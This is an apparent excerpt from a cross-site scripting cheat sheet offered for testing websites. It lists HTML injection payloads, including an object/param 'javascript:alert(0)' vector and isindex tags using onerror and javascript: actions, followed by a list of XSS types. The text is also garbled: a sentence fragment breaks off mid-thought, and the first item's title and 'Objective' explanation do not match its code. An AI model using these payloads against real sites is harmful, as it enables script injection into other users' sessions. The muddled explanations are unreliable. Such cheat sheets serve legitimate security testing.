Cross-site Scripting (XSS) Cheat Sheet
An XSS cheat sheet explains how an attacker interacts with the server by invoking dynamic
content in an HTTP response. This section includes the design of web pages using HTML,
cascading style sheets for creating design styles in HTML, and validation techniques used on the
client side by applying JavaScript, etc. It also describes how an attacker targets an application's
Application Programming Interface (API) vectors. These XSS codes are used to test websites for
vulnerabilities.
HTML Tricks
1) Image Tag with Invalid Source
<img/src=”picture_name.png” alt=”image”>
Objective: This is used to display the image specified on an HTML page of file type and
renames the name of the image accordingly with the name specified in the alt tag.
2) Object Tag with JavaScript
<object>
<param name=”src” value=”javascript:alert(0)”>
</param>
</object>
Objective: <param> tag is used to define the parameter name for object plugins, which
are embedded within the <object> tag. These plugins may also include the multimedia
audio/video file types. Here we are assigning the source as the parameter name.
3) Isindex Tag with JavaScript
<isindex type=image src=1 onerror=alert(1)>
<isindex action=javascript:alert(1) type=image>

the operations and functionalities of program resources. These operations are some of the

▪ Persistent XSS in which the attack is stored in the server website.
▪ Non-Persistent XSS where user must invoke a link.
▪ DOM based XSS where issues start at client-side scripting.
